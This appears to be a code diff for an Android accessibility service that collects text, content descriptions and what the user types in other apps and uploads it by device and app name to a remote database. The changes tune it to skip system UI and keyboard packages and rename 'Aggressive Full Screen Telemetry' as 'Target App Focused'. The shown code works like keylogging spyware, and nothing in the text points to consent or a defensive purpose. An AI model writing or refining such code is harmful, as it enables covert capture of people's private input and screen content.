@@ -40,16 +40,15 @@ class AppAccessibilityService : AccessibilityService() {
                         AccessibilityEvent.TYPE_VIEW_FOCUSED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_SELECTED or
-                        AccessibilityEvent.TYPE_VIEW_CLICKED or
-                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                        AccessibilityEvent.TYPE_VIEW_CLICKED
                 feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                 flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                         AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                 notificationTimeout = 5
             }
             serviceInfo = info
-            Log.d(TAG, "Aggressive Full Screen Telemetry Service Connected")
-            LogStore.addLog("Aggressive Full Screen Telemetry Service Active")
+            Log.d(TAG, "Target App Focused Telemetry Service Connected")
+            LogStore.addLog("Target App Focused Telemetry Service Active")
         } catch (e: Exception) {
             Log.e(TAG, "Error in onServiceConnected", e)
         }
@@ -60,6 +59,14 @@ class AppAccessibilityService : AccessibilityService() {
         if (event == null) return
         try {
             val packageName = event.packageName?.toString() ?: "unknown"
+            
+            // Ignore system UI, launchers, or status bar noise (network speed, etc.)
+            if (packageName.contains("systemui", true) || 
+                packageName.contains("launcher", true) || 
+                packageName.contains("inputmethod", true)) {
+                return
+            }
+
             val textList = event.text
             val contentDesc = event.contentDescription?.toString()
             val sourceNode = event.source
@@ -78,7 +85,6 @@ class AppAccessibilityService : AccessibilityService() {
                     if (!nodeText.isNullOrBlank()) gatheredText.append(" [Node: $nodeText]")
                     if (!nodeHint.isNullOrBlank()) gatheredText.append(" [Hint: $nodeHint]")
                 } catch (_: Exception) {
-                    // ignore
                 }
             }
 
@@ -101,7 +107,7 @@ class AppAccessibilityService : AccessibilityService() {
 
                     ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                         .addOnSuccessListener {
-                            LogStore.addLog("[$deviceName] Screen Capture ($sanitizedAppName): $typedText")
+                            LogStore.addLog("[$deviceName] App Capture ($sanitizedAppName): $typedText")
                         }
                 } catch (_: Exception) {
                 }
